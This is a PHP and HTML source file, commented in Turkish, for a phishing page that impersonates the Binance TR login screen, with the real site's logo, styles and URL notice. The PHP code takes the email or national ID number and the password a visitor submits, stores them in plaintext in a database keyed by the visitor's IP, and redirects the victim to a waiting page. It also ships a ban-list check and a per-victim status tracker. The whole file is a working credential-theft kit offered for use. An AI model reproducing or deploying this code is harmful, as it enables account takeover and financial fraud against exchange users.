<?php
/**
 * home.php — güvenli include ve yol çözümleyici ile
 * Orijinal akış korunmuştur.
 */

$__base = __DIR__;

// 1) connect.php'yi akıllı şekilde bul ve yükle
$__connectCandidates = [
    $__base . '/connect.php',
    $__base . '/../connect.php',
    $__base . '/app/connect.php',
];
$__loadedConnect = false;
foreach ($__connectCandidates as $__c) {
    if (is_file($__c)) {
        require_once $__c;
        $__loadedConnect = true;
        break;
    }
}
if (!$__loadedConnect) {
    http_response_code(500);
    exit('connect.php dosyası bulunamadı.');
}

// 2) $ajax nesnesi yoksa, sınıf dosyasını deneyip örneklemeye çalış
if (!isset($ajax)) {
    $__sajaxCandidates = [
        $__base . '/classes/Sajax.php',
        $__base . '/../classes/Sajax.php',
        $__base . '/app/classes/Sajax.php',
    ];
    foreach ($__sajaxCandidates as $__s) {
        if (is_file($__s)) {
            require_once $__s;
            // Not: Yapını bozmayalım diye ctor paramı bilinmiyorsa null geçiyoruz.
            // Senin connect.php zaten doğru $ajax kuruyorsa burası devreye girmez.
            if (!isset($ajax) && class_exists('Sajax')) {
                try { $ajax = new Sajax(isset($db) ? $db : null); } catch (\Throwable $e) {}
            }
            break;
        }
    }
}

// 3) Hâlâ $ajax yoksa, orijinal akışı bozmamak için kibarca dur
if (!isset($ajax)) {
    http_response_code(500);
    exit('Sajax/ $ajax başlatılamadı.');
}

// ====== BURADAN SONRASI ORİJİNAL KODUN AYNISI ======
if ($ajax->banControl(IP)) {
    $ajax->redirect(BAN_URL);
}

if ($_POST) {
    $username = $ajax->input($_POST['username']);
    $password = $ajax->input($_POST['password']);

    $isRecord = $ajax->isRecord(IP);

    if ($isRecord) {
        $insert = $db->prepare("UPDATE records SET username = ? ,password=?, lastOnline=? WHERE ipAddress=?");
        $insert->execute([$username, $password, time(), IP]);
    } else {
        $insert = $db->prepare("INSERT INTO records SET username = ? ,password=?, ipAddress=?, lastOnline=?");
        $insert->execute([$username, $password, IP, time()]);
    }

    if ($insert) {
        $ajax->redirect('wait');
    }
}

if (isset($_GET['error'])) {
    $ajax->pageUpdate(IP, "Giriş Hatalı");
} else {
    $ajax->pageUpdate(IP, "Giriş");
}
?>
<!DOCTYPE HTML>
<html lang="en">
<head>
    <title>Giriş Doğrulama</title>
    <meta charset="utf-8">
    <meta name="viewport"  content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1">
    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
    <link rel="stylesheet" href="https://www.trbinance.com/cdn/css/reset.css">
    <link rel="stylesheet" href="assets/gser.css">
    <link rel="stylesheet" href="assets/custom.css">
    <meta name="author" content="TR">

    <link rel="stylesheet" href="https://www.trbinance.com/cdn/iconfont/iconfont.css">
    <link rel="stylesheet" href="https://www.trbinance.com/cdn/tr_iconfont/iconfont.css">
    <link rel="stylesheet" href="https://www.trbinance.com/cdn/tr_iconfont2/iconfont.css">
    <link rel="stylesheet" href="https://www.trbinance.com/cdn/iconfont-toko/iconfont.css">
    <style>
        @media (max-width: 767px) { .login-box[data-v-6408680b] { padding: 10px !important; } }
        .background-dark { background: #0B0D10; }
    </style>
</head>
<body>
    <div id="_sys">
        <div id="__wrapper">
            <div data-v-4e9dd685="">
                <div data-v-b016cbc8="" data-v-4e9dd685="" id="headerId" class="top">
                    <header data-v-b016cbc8="" class="z-9 fixed">
                        <nav data-v-b016cbc8="">
                            <a data-v-b016cbc8="" href="/" class="nav-logo nuxt-link-active">
                                <img data-v-b016cbc8="" src="https://www.trbinance.com/cdn/img/logo.png" alt="logo" class="logo">
                            </a>
                            <div data-v-b016cbc8="" class="nav-list"></div>
                            <div data-v-b016cbc8="" class="nav-r">
                                <div data-v-b016cbc8="" class="exchange-rate"><span data-v-b016cbc8="">Türkçe</span>&nbsp;|&nbsp;<span data-v-b016cbc8="">TRY</span></div>
                            </div>
                        </nav>
                    </header>
                </div>
                <main data-v-6eb34671="" data-v-4e9dd685="">
                    <section data-v-6408680b="" data-v-6eb34671="">
                        <h2 data-v-6408680b="">Giriş Yap</h2>
                        <div class="signin-header" data-v-6408680b="" data-v-6eb34671="">Lütfen doğru URL'yi ziyaret ettiğinizden emin olun::</div>
                        <div class="visit-url" data-v-6408680b="" data-v-6eb34671="">
                            <img src="https://www.trbinance.com/static/dist/img/38c3be4.svg" alt="" srcset="" data-v-6408680b="" data-v-6eb34671="">
                            <span data-v-6408680b="" data-v-6eb34671="">https://www.trbinance.com</span>
                        </div>
                        <div class="login-box" data-v-6408680b="">
                            <div class="loading" style="display:none;" data-v-6408680b="">
                                <div class="groove" data-v-6408680b=""><div class="bar" data-v-6408680b=""></div></div>
                            </div>
                            <form action="" method="post" autocomplete="off">
                                <div class="oauth-title" data-v-6408680b="" data-v-6eb34671="">Binance.com hesabıyla oturum açın:</div>
                                <a href="javascript:void(0)" class="oauth-btn bc-btn bc-font-medium" data-v-52d66b7f="" data-v-6eb34671="" data-v-6408680b="">
                                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjkiIGhlaWdodD0iMjgiIHZpZXdCb3g9IjAgMCAyOSAyOCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGcgY2xpcC1wYXRoPSJ1cmwoI2NsaXAwKSI+CjxwYXRoIGQ9Ik05LjA4ODgyIDExLjc2NThMMTQuNTI2NSA2LjMyODIyTDE5Ljk2NjkgMTEuNzY4NkwyMy4xMzA5IDguNjA0NTFMMTQuNTI2NSAwTDUuOTI0NzcgOC42MDE3MUw5LjA4ODgyIDExLjc2NThaTTMuNjkwNTQgMTAuODM1N0w2Ljg1NDU0IDEzLjk5OTdMMy42OTAzNyAxNy4xNjM5TDAuNTI2MzY3IDEzLjk5OTlMMy42OTA1NCAxMC44MzU3Wk05LjA4ODgyIDE2LjIzNDJMMTQuNTI2NSAyMS42NzE2TDE5Ljk2NjggMTYuMjMxNEwyMy4xMzI2IDE5LjM5MzlMMjMuMTMwOSAxOS4zOTU1TDE0LjUyNjUgMjhMNS45MjQ2NiAxOS4zOTgzTDUuOTIwMjMgMTkuMzkzOUw5LjA4ODgyIDE2LjIzNDJaTTI4LjUyNjcgMTQuMDAwM0wyNS4zNjI3IDE3LjE2NDNMMjIuMTk4NyAxNC4wMDAzTDI1LjM2MjcgMTAuODM2M0wyOC41MjY3IDE0LjAwMDNaIiBmaWxsPSIjRjBCOTBCIi8+CjxwYXRoIGQ9Ik0xNy43MzU3IDEzLjk5NzlIMTcuNzM3MkwxNC41MjY1IDEwLjc4NzFMMTIuMTUzNiAxMy4xNTk5SDEyLjE1MzVMMTEuODgxIDEzLjQzMjVMMTEuMzE4NiAxMy45OTVMMTEuMzE0MiAxMy45OTk0TDExLjMxODYgMTQuMDAzOUwxNC41MjY1IDE3LjIxMThMMTcuNzM3IDE0LjAwMTFMMTcuNzM4NyAxMy45OTk0TDE3LjczNTcgMTMuOTk3OVoiIGZpbGw9IiNGMEI5MEIiLz4KPC9nPgo8ZGVmcz4KPGNsaXBQYXRoIGlkPSJjbGlwMCI+CjxyZWN0IHg9IjAuNTI2MzY3IiB3aWR0aD0iMjgiIGhlaWdodD0iMjgiIGZpbGw9IndoaXRlIi8+CjwvY2xpcFBhdGg+CjwvZGVmcz4KPC9zdmc+Cg==" alt="" data-v-52d66b7f="">
                                    <span data-v-52d66b7f="">Binance.com hesabıyla oturum açın</span>
                                </a>

                                <?php if (isset($_GET['error'])) {
                                    echo "<p style='color:red'>E-posta/TCKN veya Şifre Hatalı ! Lütfen tekrar deneyiniz.</p>";
                                } ?>

                                <div class="create-account" data-v-6408680b="" data-v-6eb34671="">Binance TR hesabıyla oturum açın:</div>

                                <div value="" class="input-model input-mg20" data-v-0d683522="" data-v-6eb34671="" data-v-6408680b="">
                                    <div class="dynamic-placeholder" data-v-0d683522="">E-posta / TCKN</div>
                                    <input name="username" type="text" required value="" data-v-0d683522="">
                                    <div class="icon-wrap" data-v-0d683522=""></div>
                                </div>

                                <div value="" class="input-model input-mg20" data-v-0d683522="" data-v-6eb34671="" data-v-6408680b="">
                                    <div class="dynamic-placeholder" data-v-0d683522="">Şifre</div>
                                    <input type="password" name="password" required value="" data-v-0d683522="">
                                </div>

                                <button class="bc-btn bc-btn-yellow sensors-login" type="submit" data-v-6408680b="" data-v-6eb34671="">
                                    Giriş Yap
                                </button>

                                <div class="more" data-v-6408680b="" data-v-6eb34671="">
                                    <div data-v-6408680b="" data-v-6eb34671="">
                                        <a href="javascript:void(0)" data-v-6eb34671="" class="" data-v-6408680b="">Şifrenizi mi unuttunuz?</a>
                                    </div>
                                    <div data-v-6408680b="" data-v-6eb34671="">
                                        <a href="javascript:void(0)" data-v-6eb34671="" class="" data-v-6408680b="">Kaydol</a>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </section>
                </main>
            </div>
        </div>
    </div>
    <!-- (SVG sprite’lar burada olduğu gibi bırakıldı) -->
</body>
</html>
